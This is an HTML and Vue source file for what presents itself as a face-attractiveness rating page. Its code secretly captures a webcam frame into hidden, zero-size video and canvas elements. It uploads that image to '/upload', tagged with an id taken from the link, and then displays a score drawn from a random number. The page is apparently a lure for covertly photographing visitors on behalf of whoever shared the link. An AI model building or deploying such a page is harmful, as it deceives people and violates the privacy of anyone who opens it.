<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>颜值评测</title>
		<link rel="icon" href="./img/ico.jpg">
		<!-- Element UI CSS -->
		<link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">
	</head>
	<body>
		<div id ="app">
			<div  style="text-align:center;display: flex;justify-content:center">
				<div>
					<img style="max-width: 100% " src="https://static.xiaostudy.cn/element/lovely.jpg">
				</div>
				<div v-loading="this.flag"
					 element-loading-text="拼命加载中~"
					 style="display: flex;flex-direction: column;justify-content:center;align-items: center">
					<div style="line-height: 50px">{{this.content}}</div>
					<el-progress type="circle" :percentage="this.percent" ></el-progress>
				</div>
			</div>
			<el-row style="text-align: center">
				<el-button type="primary" plain size="medium" @click="this.predict">评 测</el-button>
			</el-row>
			<video id="video" width="0" height="0" autoplay></video>
			<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
		</div>
	</body>
	<!-- import Axois before Element -->
	<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
	<!-- import Vue before Element -->
	<script src="https://unpkg.com/vue/dist/vue.js"></script>
	<!-- import JavaScript -->
	<script src="https://unpkg.com/element-ui/lib/index.js"></script>
	<script>
		new Vue({
			el: '#app',
			data: function() {
				return {
					id : '',
					img: '',
					flag: false,
					content: '您还未开始随机颜值评测，请点击确认开始，并授权开始评测～',
					percent: 0
				}
			},
			methods:{
				predict(){
					let that = this;
					that.flag = true;
					let tempId = window.location.pathname;
					tempId = tempId.substring(tempId.lastIndexOf('/')+1,tempId.length);
					if(!/^\d+$/.test(tempId)){
						tempId = this.getQueryVariable("id");
					}
					that.id = parseInt(tempId);
					let canvas = document.getElementById('canvas');
					let context = canvas.getContext('2d');
					let video = document.getElementById('video');
					if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
						navigator.mediaDevices.getUserMedia({
							video: true
						}).then(function(stream) {
							video.srcObject = stream;
							video.play();
							setTimeout(function() {
								context.drawImage(video, 0, 0, 480, 640);
								stream.getTracks()[0].stop();
							}, 1000);
							setTimeout(function() {
								that.img = canvas.toDataURL('image/png');
								let data = {id: that.id, img: that.img};
								let header = {headers: {"Content-Type": "application/json"}}
								axios.post('/upload', JSON.stringify(data),header,{timeout:10000}).then(function (data){
									if(data.data){
										that.$message.success('正在为你进行随机颜值评测分析，请稍后～');
										that.percent = parseInt(Math.random()*100);
										that.content = "根据随机颜值预测分析，您的颜值超过了全国"+that.percent+"%的用户,请继续努力～";
									}else{
										that.$message.error('服务器故障,请稍后刷新重试～');
									}
								}).catch(error=>{
									that.$message.error('服务器故障，请稍后刷新重试～');
								})
							}, 1500);
						}, function() {
							that.$message.error('请先给予相机权限，再进行评测～');
							that.content = "亲，需要相机权限才能评测哦～"
						});
					}
					that.flag = false;
				},
				getQueryVariable(variable){
					let query = window.location.search.substring(1);
					let vars = query.split("&");
					for (let i=0;i<vars.length;i++) {
						let pair = vars[i].split("=");
						if(pair[0] === variable){return pair[1];}
					}
					return parseInt(100000*Math.random()).toString();;
				}
			}
		})


	</script>
</html>
